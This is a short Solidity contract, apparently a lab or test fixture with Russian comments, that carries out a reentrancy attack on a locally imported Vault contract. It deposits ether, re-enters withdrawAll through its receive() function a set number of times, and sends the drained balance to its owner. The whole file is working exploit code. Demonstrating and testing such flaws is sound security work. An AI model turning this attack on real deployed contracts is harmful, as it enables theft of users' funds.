// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Vault} from "./Vault.sol";

/// @notice Атака повторного входа на Vault.withdrawAll (сценарий A).
/// Депозит и вывод - в одной транзакции, число повторных входов ограничено.
contract Attacker {
    Vault public immutable vault;
    address public immutable owner;
    uint256 private reentries;
    uint256 private maxReentries;

    constructor(Vault vault_) {
        vault = vault_;
        owner = msg.sender;
    }

    function attack(uint256 maxReentries_) external payable {
        require(msg.sender == owner, "not owner");
        reentries = 0;
        maxReentries = maxReentries_;
        vault.deposit{value: msg.value}();
        vault.withdrawAll();
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "send failed");
    }

    receive() external payable {
        if (msg.sender == address(vault) && reentries < maxReentries) {
            reentries++;
            vault.withdrawAll();
        }
    }
}
